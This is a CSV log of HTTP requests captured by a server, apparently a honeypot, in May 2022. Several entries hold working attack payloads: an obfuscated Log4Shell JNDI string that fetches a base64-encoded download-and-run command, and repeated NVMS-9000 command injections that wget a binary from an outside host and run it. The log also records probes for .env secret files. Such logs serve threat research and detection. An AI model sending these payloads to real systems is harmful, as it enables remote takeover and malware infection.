ID,ADDR,VALUE,TIME
REQ_529_P80,"('143.244.35.193', 49098)","b""GET / HTTP/1.1\r\nAccept: application/json, text/plain, */*\r\nX-Api-Version: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvdW5hbWU7IGN1cmwgLU8gaHR0cDovLzE0MC4yMzguMTgwLjM0L3VuYW1lOyBjaG1vZCA3NzcgdW5hbWU7IC4vdW5hbWUgbWV0YWw=}')\r\nUser-Agent: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvdW5hbWU7IGN1cmwgLU8gaHR0cDovLzE0MC4yMzguMTgwLjM0L3VuYW1lOyBjaG1vZCA3NzcgdW5hbWU7IC4vdW5hbWUgbWV0YWw=}')\r\nReferer: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvdW5hbWU7IGN1cmwgLU8gaHR0cDovLzE0MC4yMzguMTgwLjM0L3VuYW1lOyBjaG1vZCA3NzcgdW5hbWU7IC4vdW5hbWUgbWV0YWw=}')\r\nCookie: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvdW5hbWU7IGN1cmwgLU8gaHR0cDovLzE0MC4yMzguMTgwLjM0L3VuYW1lOyBjaG1vZCA3NzcgdW5hbWU7IC4vdW5hbWUgbWV0YWw=}')\r\nAuthentication: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvdW5hbWU7IGN1cmwgLU8gaHR0cDovLzE0MC4yMzguMTgwLjM0L3VuYW1lOyBjaG1vZCA3NzcgdW5hbWU7IC4vdW5hbWUgbWV0YWw=}')\r\nBearer: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvdW5hbWU7IGN1cmwgLU8gaHR0cDovLzE0MC4yMzguMTgwLjM0L3VuYW1lOyBjaG1vZCA3NzcgdW5hbWU7IC4vdW5hbWUgbWV0YWw=}')\r\nCF-Connecting_IP: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvdW5hbWU7IGN1cmwgLU8gaHR0cDovLzE0MC4yMzguMTgwLjM0L3VuYW1lOyBjaG1vZCA3NzcgdW5hbWU7IC4vdW5hbWUgbWV0YWw=}')\r\nX-Forwarded-For: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvdW5hbWU7IGN1cmwgLU8gaHR0cDovLzE0MC4yMzguMTgwLjM0L3VuYW1lOyBjaG1vZCA3NzcgdW5hbWU7IC4vdW5hbWUgbWV0YWw=}')\r\nX-Real-IP: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvdW5hbWU7IGN1cmwgLU8gaHR0cDovLzE0MC4yMzguMTgwLjM0L3VuYW1lOyBjaG1vZCA3NzcgdW5hbWU7IC4vdW5hbWUgbWV0YWw=}')\r\nX-Client-IP: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvdW5hbWU7IGN1cmwgLU8gaHR0cDovLzE0MC4yMzguMTgwLjM0L3VuYW1lOyBjaG1vZCA3NzcgdW5hbWU7IC4vdW5hbWUgbWV0YWw=}')\r\nOriginating-IP: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTQwLjIzOC4xODAuMzQvdW5hbWU7IGN1cmwgLU8gaHR0cDovLzE0MC4yMzguMTgwLjM0L3VuYW1lOyBjaG1vZCA3NzcgdW5hbWU7IC4vdW5hbWUgbWV0YWw=}')\r\nHost: 54.91.30.20\r\nConnection: close\r\n\r\n""",2022-05-27 15:11:17.744692
REQ_530_P80,"('143.198.146.178', 50806)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Linux Gnu (cow) \r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",2022-05-27 15:12:41.823348
REQ_531_P80,"('218.54.127.233', 51081)","b'POST /editBlackAndWhiteList HTTP/1.1\r\nAccept-Encoding: identity\r\nContent-Length: 644\r\nAccept-Language: en-us\r\nHost: 54.91.30.20:88\r\nAccept: */*\r\nUser-Agent: Mozila/5.0\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Type: text/xml\r\nAuthorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=\r\n\r\n<?xml version=""1.0"" encoding=""utf-8""?><request version=""1.0"" systemType=""NVMS-9000"" clientType=""WEB""><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=""filterTypeMode"">refuse</filterType><filterList type=""list""><itemType><addressType type=""addressType""/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(cd${IFS}/tmp;wget${IFS}http://92.118.230.134/garm7${IFS}-O-${IFS}>GSec;chmod${IFS}777${IFS}GSec;./GSec${IFS}tvt)</ip></item></filterList></content></request>\x11'",2022-05-27 15:22:25.116839
REQ_532_P80,"('221.15.236.237', 47820)","b'POST /editBlackAndWhiteList HTTP/1.1\r\nAccept-Encoding: identity\r\nContent-Length: 644\r\nAccept-Language: en-us\r\nHost: 20.30.91.54:80\r\nAccept: */*\r\nUser-Agent: Mozila/5.0\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Type: text/xml\r\nAuthorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=\r\n\r\n<?xml version=""1.0"" encoding=""utf-8""?><request version=""1.0"" systemType=""NVMS-9000"" clientType=""WEB""><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=""filterTypeMode"">refuse</filterType><filterList type=""list""><itemType><addressType type=""addressType""/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(cd${IFS}/tmp;wget${IFS}http://92.118.230.134/garm7${IFS}-O-${IFS}>GSec;chmod${IFS}777${IFS}GSec;./GSec${IFS}tvt)</ip></item></filterList></content></request>'",2022-05-29 20:23:02.665154
REQ_533_P80,"('137.184.92.62', 34780)","b'GET / HTTP/1.1\r\nHost: 54.91.30.20:80\r\nUser-Agent: Linux Gnu (cow) \r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n'",2022-05-30 08:20:42.336226
REQ_534_P80,"('198.23.200.115', 52418)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-30 08:25:44.601389
REQ_535_P80,"('211.38.178.18', 41617)","b'POST /editBlackAndWhiteList HTTP/1.1\r\nAccept-Encoding: identity\r\nContent-Length: 644\r\nAccept-Language: en-us\r\nHost: 54.91.30.20:88\r\nAccept: */*\r\nUser-Agent: Mozila/5.0\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Type: text/xml\r\nAuthorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=\r\n\r\n<?xml version=""1.0"" encoding=""utf-8""?><request version=""1.0"" systemType=""NVMS-9000"" clientType=""WEB""><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=""filterTypeMode"">refuse</filterType><filterList type=""list""><itemType><addressType type=""addressType""/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(cd${IFS}/tmp;wget${IFS}http://92.118.230.134/garm7${IFS}-O-${IFS}>GSec;chmod${IFS}777${IFS}GSec;./GSec${IFS}tvt)</ip></item></filterList></content></request>\x0c'",2022-05-30 09:04:38.473555
REQ_536_P80,"('185.254.196.115', 56298)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-30 09:12:12.420997
REQ_537_P80,"('179.43.156.214', 50250)",b'GET / HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-Agent: Mozilla/5.0 zgrab/0.x\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n',2022-05-30 09:41:34.953367
REQ_538_P80,"('157.245.70.127', 56328)",b'GET /ab2g HTTP/1.1\r\n\r\n',2022-05-30 09:59:10.782480
REQ_539_P80,"('157.245.70.127', 56666)",b'GET /ab2h HTTP/1.1\r\n\r\n',2022-05-30 09:59:11.004873
REQ_540_P80,"('175.174.172.100', 60145)","b'POST /editBlackAndWhiteList HTTP/1.1\r\nAccept-Encoding: identity\r\nContent-Length: 644\r\nAccept-Language: en-us\r\nHost: 54.91.30.20:85\r\nAccept: */*\r\nUser-Agent: Mozila/5.0\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Type: text/xml\r\nAuthorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=\r\n\r\n<?xml version=""1.0"" encoding=""utf-8""?><request version=""1.0"" systemType=""NVMS-9000"" clientType=""WEB""><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=""filterTypeMode"">refuse</filterType><filterList type=""list""><itemType><addressType type=""addressType""/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(cd${IFS}/tmp;wget${IFS}http://92.118.230.134/garm7${IFS}-O-${IFS}>GSec;chmod${IFS}777${IFS}GSec;./GSec${IFS}tvt)</ip></item></filterList></content></request>\x11'",2022-05-30 10:31:37.908498
REQ_541_P80,"('115.148.154.30', 47156)",b'',2022-05-30 10:38:34.241102
REQ_542_P80,"('36.5.199.135', 47324)","b'HEAD http://110.242.68.4/ HTTP/1.1\r\nHost: 110.242.68.4\r\nProxy-Authorization: Basic Og==\r\nProxy-Connection: Keep-Alive\r\nAccept-Encoding: gzip, deflate, sdch\r\nUser-Agent: Mozilla/5.01678543 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\r\nAccept-Language: zh-CN,zh;q=0.8\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n'",2022-05-30 10:38:34.592549
REQ_543_P80,"('185.254.196.115', 33286)","b'GET /.env HTTP/1.1\r\nHost: 54.91.30.20\r\nUser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n'",2022-05-30 10:41:38.298298
REQ_544_P80,"('119.193.161.235', 39735)","b'POST /editBlackAndWhiteList HTTP/1.1\r\nAccept-Encoding: identity\r\nContent-Length: 644\r\nAccept-Language: en-us\r\nHost: 54.91.30.20:8000\r\nAccept: */*\r\nUser-Agent: Mozila/5.0\r\nConnection: close\r\nCache-Control: max-age=0\r\nContent-Type: text/xml\r\nAuthorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=\r\n\r\n<?xml version=""1.0"" encoding=""utf-8""?><request version=""1.0"" systemType=""NVMS-9000"" clientType=""WEB""><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type=""filterTypeMode"">refuse</filterType><filterList type=""list""><itemType><addressType type=""addressType""/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(cd${IFS}/tmp;wget${IFS}http://92.118.230.134/garm7${IFS}-O-${IFS}>GSec;chmod${IFS}777${IFS}GSec;./GSec${IFS}tvt)</ip></item></filterList></content></request>\x11'",2022-05-30 15:21:21.979542
REQ_545_P80,"('222.175.199.226', 22789)",b'GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: Close\r\n\r\n',2022-05-30 15:28:19.294842
